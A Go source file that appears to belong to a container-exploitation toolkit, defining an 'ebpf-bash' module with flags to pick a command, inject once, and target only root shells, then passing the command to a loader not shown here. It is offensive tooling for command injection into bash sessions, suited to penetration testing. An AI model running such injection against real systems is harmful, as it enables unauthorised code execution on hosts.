package bash

import (
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/urfave/cli/v2"
)

var (
	aliases = []string{"bash"}
	// TODO: implement flags
	flagsExploit = []cli.Flag{
		&cli.StringFlag{
			Name:    "cmd",
			Aliases: []string{"c"},
			Usage:   "command to execute, default: id",
			Value:   "id",
		},
		&cli.BoolFlag{
			Name:    "once",
			Aliases: []string{"o"},
			Usage:   "exit after injecting once",
			Value:   false,
		},
		&cli.BoolFlag{
			Name:    "root",
			Aliases: []string{"r"},
			Usage:   "only inject root shells",
			Value:   false,
		},
	}
	ExploitCmd = app.Vul2ExploitCmd(&Vul, aliases, flagsExploit, true)
	VulCmd     = app.Vul2VulCmd(&Vul, aliases, nil, flagsExploit, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var Vul = vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "ebpf-bash",
		Description: "",
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.InContainer,
			Check:   exeenv.InContainer,
			Exploit: exeenv.InContainer,
		},
		CheckSecPrerequisites:    nil,
		ExploitablePrerequisites: nil,
	},
}

func (v *vulnerability) Exploit(context *cli.Context) (err error) {
	if err := v.BaseVulnerability.Exploit(context); err != nil {
		return err
	}
	return Load(context.String("cmd"))
}
